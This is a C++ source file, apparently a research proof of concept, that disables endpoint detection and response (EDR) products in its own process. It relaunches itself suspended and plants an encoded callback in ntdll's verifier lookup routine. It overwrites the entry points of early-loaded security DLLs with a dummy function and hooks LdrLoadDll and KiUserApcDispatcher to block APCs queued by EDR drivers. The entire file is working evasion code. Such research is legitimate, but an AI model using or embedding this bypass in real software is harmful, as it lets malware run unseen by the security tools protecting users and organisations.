#include <Windows.h>
#include <stdio.h>
#include "Includes/Types.h"
#include "Includes/SafeRuntime.h"
#include "Includes/hde64.h"

static PTR_TABLE g_ptr_table = { 0 };

t_LdrLoadDll OriginalLdrLoadDll;

// Declare functions as extern C so we don't have to mess with C++ name mangling during linking with KiUserApc.asm.
extern "C" {
	// defined in KiUserApc.asm
	void KiUserApcDispatcher();

	// called from KiuserApcDispatcher() to get the NtContinue() address from g_ptr_table structure 
	LPVOID GetNtContinue() {
		return g_ptr_table.NtContinue;
	}
}

// get the base address of a PE section (used to find .mrdata in ntdll)
ULONG_PTR GetSectionBase(ULONG_PTR base_address, const char* name) {
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_headers;
	IMAGE_SECTION_HEADER* section_header;

	dos_header = (IMAGE_DOS_HEADER*)base_address;
	nt_headers = (IMAGE_NT_HEADERS*)((ULONG_PTR)dos_header + dos_header->e_lfanew);
	section_header = (IMAGE_SECTION_HEADER*)((ULONG_PTR)nt_headers + sizeof(IMAGE_NT_HEADERS));

	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE || nt_headers->Signature != IMAGE_NT_SIGNATURE) {
		printf("GetSectionBase() failed, invalid header\n");
		return NULL;
	}

	for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
		if (SafeRuntime::memcmp(name, section_header[i].Name, SafeRuntime::strlen(name)) == 0) {
			return base_address + section_header[i].VirtualAddress;
		}
	}

	printf("GetSectionBase() failed, section not found\n");
	return NULL;
}

// a simple hooking function to enable us to hook ntdll functions (don't use this in prod, the code is awful)
void HookFunction(LPVOID target_address, LPVOID hook_procedure, LPVOID *original_bytes) {
	BYTE jmp_buffer[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
	BYTE ret_buffer[32] = { 0x90 };
	DWORD old_protection = 0;
	size_t total_size = 0, inst_len = 0;
	PVOID exec_buffer = NULL;
	PVOID protect_address = NULL;

	BYTE* ip = (BYTE *)target_address;

	// figure out how many instructions we're going to overwrite so we can save them
	while (total_size < sizeof(jmp_buffer)) {
		hde64s s;
		inst_len = hde64_disasm(&ip[total_size], &s);
		total_size += inst_len;
	}

	if (original_bytes) {
		// make the jump instruction to return to the original function
		*(ULONG_PTR*)&jmp_buffer[2] = ((ULONG_PTR)target_address + total_size);

		// copy the bytes we'll overwrite into the ret buffer
		SafeRuntime::memcpy(&ret_buffer, target_address, total_size);

		// append the original bytes with a jmp to return to the original function
		SafeRuntime::memcpy(&ret_buffer[total_size], &jmp_buffer, sizeof(jmp_buffer));

		// allocate some executable memory to copy the original bytes to
		g_ptr_table.NtAllocateVirtualMemory((HANDLE)-1, &exec_buffer, 0, &total_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		*original_bytes = exec_buffer;

		// copy the original bytes
		SafeRuntime::memcpy(*original_bytes, &ret_buffer, sizeof(ret_buffer));
	}

	protect_address = target_address;

	// set the target page memory to RWX so we can write our hooks to it
	g_ptr_table.NtProtectVirtualMemory((HANDLE)-1, &protect_address, &total_size, PAGE_EXECUTE_READWRITE, &old_protection);

	// make the jump instruction to redirect execution to our hook handler
	*(ULONG_PTR*)&jmp_buffer[2] = ((ULONG_PTR)hook_procedure);

	// hook the target function
	SafeRuntime::memcpy(target_address, &jmp_buffer, sizeof(jmp_buffer));

	// re-protect the executable memory
	g_ptr_table.NtProtectVirtualMemory((HANDLE)-1, &protect_address, &total_size, old_protection, &old_protection);
}

// a benign function we can replace the EDR entrypoint pointer with
DWORD EdrParadise() {
	// we'll replaced the EDR entrypoint with this equally useful function
	// todo: stop malware

	return ERROR_TOO_MANY_SECRETS;
}

/*
	Some EDRs are able to call LdrLoadDll() before our LdrGetProcedureAddress() callback is run
	in this case, our callback will be called before LdrLoadDll() is done loading the EDR DLL.
	We'll defang the EDR by replacing its DLL entrypoint with a benign function.
*/
void DisablePreloadedEdrModules() {
	PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;

	LIST_ENTRY* list_head = &peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* list_entry = list_head->Flink->Flink;

	while (list_entry != list_head) {
		PLDR_DATA_TABLE_ENTRY2 module_entry = CONTAINING_RECORD(list_entry, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);

		// only ntdll.dll, kernel32.dll, and kernelbase.dll should be loaded this early, anything else is probably an EDR
		if (SafeRuntime::wstring_compare_i(module_entry->BaseDllName.Buffer, L"ntdll.dll") != 0 &&
			SafeRuntime::wstring_compare_i(module_entry->BaseDllName.Buffer, L"kernel32.dll") != 0 &&
			SafeRuntime::wstring_compare_i(module_entry->BaseDllName.Buffer, L"kernelbase.dll") != 0) {

			module_entry->EntryPoint = &EdrParadise;
		}

		list_entry = list_entry->Flink;
	}
}

// we can use this hook to prevent new modules from being loaded (though with both EDRs I tested, we don't need to)
NTSTATUS WINAPI LdrLoadDllHook(PWSTR search_path, PULONG dll_characteristics, UNICODE_STRING* dll_name, PVOID* base_address) {
	g_ptr_table.OutputDebugStringW(dll_name->Buffer);
	return OriginalLdrLoadDll(search_path, dll_characteristics, dll_name, base_address);
}

// ntdll encrypts all pointers for exploit mitigation, but since we're already on the system we can bypass this
LPVOID encode_system_ptr(LPVOID ptr) {
	// get pointer cookie from SharedUserData!Cookie (0x330)
	ULONG cookie = *(ULONG*)0x7FFE0330;

	// encrypt our pointer so it'll work when written to ntdll
	return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

// find the address of ntdll!AvrfpAPILookupCallbackRoutine by scanning the .mrdata section of ntdll
ULONG_PTR find_avrfp_address(ULONG_PTR mrdata_base) {
	ULONG_PTR address_ptr = mrdata_base + 0x280;
	ULONG_PTR ldrp_mrdata_base = NULL;

	// LdrpMrdataBase contains the .mrdata section base address and is located directly before AvrfpAPILookupCallbackRoutine
	for (int i = 0; i < 10; i++) {
		if (*(ULONG_PTR*)address_ptr == mrdata_base) {
			printf("found ntdll!LdrpMrdataBase at 0x%llx\n", address_ptr);
			ldrp_mrdata_base = address_ptr;
			break;
		}
		address_ptr += sizeof(LPVOID);  // skip to the next pointer
	}

	if (!ldrp_mrdata_base) {
		printf("failed to find ntdll!LdrpMrdataBase");
		return NULL;
	}

	address_ptr = ldrp_mrdata_base;

	// AvrfpAPILookupCallbackRoutine should be the first NULL pointer after LdrpMrdataBase
	for (int i = 0; i < 10; i++) {
		if (*(ULONG_PTR*)address_ptr == NULL) {
			printf("found ntdll!AvrfpAPILookupCallbackRoutine at 0x%llx\n", address_ptr);
			return address_ptr;
		}
		address_ptr += sizeof(LPVOID);  // skip to the next pointer
	}

	return NULL;
}

/*
	This function will execute every time LdrGetProcedureAddress() is called.
	The first call is extremely early in the process load, during (When kernel32.dll is loaded by LdrpInitializeProcess()).
	since only ntdll.dll is loaded, and we're inside the loader lock, we must be extremely careful.
	Calling LoadLibrary() or starting a thread will deadlock the process.
*/
LPVOID WINAPI LdrGetProcedureAddressCallback(LPVOID dll_base, LPVOID caller, LPVOID func_addr) {
	static BOOL hook_placed = FALSE;

	if (!hook_placed) {
		hook_placed = TRUE;

		// The PsSetLoadImageNotifyRoutine() callback for ntdll (and maybe kernel32) can be fired slightly before our callback.
		// as a result, some EDR DLLs could be mapped but not yet initialized. To counter this we'll replace the their entrypoints.
		DisablePreloadedEdrModules();

		// we'll hook LdrLoadDll() just for debugging purposes (we can use it to block DLL loads, but shouldn't need to).
		HookFunction(g_ptr_table.LdrLoadDll, LdrLoadDllHook, (LPVOID*)&OriginalLdrLoadDll);

		// we'll hook KiUserApcDispatcher() to prevent any APCs being queued into our process from the EDR's kernel driver.
		HookFunction(g_ptr_table.KiUserApcDispatcher, KiUserApcDispatcher, NULL);
	}

	return func_addr;
}

// re-launch our process and hook the loader by enabling ntdll!AvrfpAPILookupCallbackRoutine
void EDRPreloader(char* file_path) {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");


	// find the address of ntdll!AvrfpAPILookupCallbacksEnabled
	ULONG_PTR avrfp_address = find_avrfp_address(GetSectionBase((ULONG_PTR)ntdll, ".mrdata"));
	if (!avrfp_address) {
		printf("failed to find address of ntdll!AvrfpAPILookupCallbackRoutine\n");
		return;
	}

	// we can't call GetProcAddress() in the child process due to kernel32 not being loaded, so we'll resolve ahead of time
	// we could always implement a custom GetModuleHandle() and GetProcAddress() equivalent, but why.
	g_ptr_table.NtProtectVirtualMemory = (t_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	g_ptr_table.NtAllocateVirtualMemory = (t_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	g_ptr_table.LdrLoadDll = (t_LdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
	g_ptr_table.NtContinue = (t_NtContinue)GetProcAddress(ntdll, "NtContinue");
	g_ptr_table.KiUserApcDispatcher = (t_NtContinue)GetProcAddress(ntdll, "KiUserApcDispatcher");
	g_ptr_table.OutputDebugStringW = (t_OutputDebugStringW)GetProcAddress(kernel32, "OutputDebugStringW");


	si.cb = sizeof(si);

	// start a second copy of or process in a suspended state so we can set up our callback safely
	if (!CreateProcessA(NULL, file_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("C() failed, error: %d\n", GetLastError());
	}

	// overwrite the g_ptr_table in the child process with the already initialized one
	if (!WriteProcessMemory(pi.hProcess, &g_ptr_table, &g_ptr_table, sizeof(PTR_TABLE), NULL)) {
		printf("Write 1 failed, error: %d\n", GetLastError());
	}

	// ntdll pointer are encoded using the system pointer cookie located at SharedUserData!Cookie
	LPVOID callback_ptr = encode_system_ptr(&LdrGetProcedureAddressCallback);

	// set ntdll!AvrfpAPILookupCallbackRoutine to our encoded callback address
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(avrfp_address + 8), &callback_ptr, sizeof(ULONG_PTR), NULL)) {
		printf("Write 2 failed, error: %d\n", GetLastError());
	}

	// set ntdll!AvrfpAPILookupCallbacksEnabled to TRUE
	uint8_t bool_true = 1;

	if (!WriteProcessMemory(pi.hProcess, (LPVOID)avrfp_address, &bool_true, 1, NULL)) {
		printf("Write 3 failed, error: %d\n", GetLastError());
	}

	// resume the process
	ResumeThread(pi.hThread);
}

// check if EDR hooks are deployed by checking the first two instructions of some commonly hooked ntdll function
void CheckForHooks() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	LPVOID ntmap, ntallocate, ntsetcontext;

	BYTE syscall_stub_prefix[] = {
		0x4c, 0x8b, 0xd1,   // mov r10, rcx
		0xb8                // mov eax, ??
	};

	ntmap = GetProcAddress(ntdll, "NtMapViewOfSection");
	ntallocate = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	ntsetcontext = GetProcAddress(ntdll, "NtSetContextThread");

	printf("NtSetContextThread hooked: %s\n", (*(DWORD*)ntsetcontext != *(DWORD*)&syscall_stub_prefix) ? "True" : "False");
	printf("NtAllocateVirtualMemory hooked: %s\n", (*(DWORD*)ntallocate != *(DWORD*)&syscall_stub_prefix) ? "True" : "False");
	printf("NtMapViewOfSection hooked: %s\n", (*(DWORD*)ntmap != *(DWORD*)&syscall_stub_prefix) ? "True" : "False");
}

int main(int argc, char *argv[])
{
	// if the g_ptr_table isn't yet initialized, this is our first run.
	if (g_ptr_table.LdrLoadDll == 0) {
		printf("WARNING: app crashes during LdrpInitializeProcess() can freeze the system, run this PoC in a VM.\n");
		printf("hit return to continue.\n");
		getchar();

		CheckForHooks();

		printf("\nRunning EDRPreloader...\n\n");

		// re-launch our process with the EDR-Preload bypass in place
		EDRPreloader(argv[0]);
	}
	else {
		printf("\nHello from a (hopefully) unhooked process!\n");

		CheckForHooks();
	}

	getchar();
}
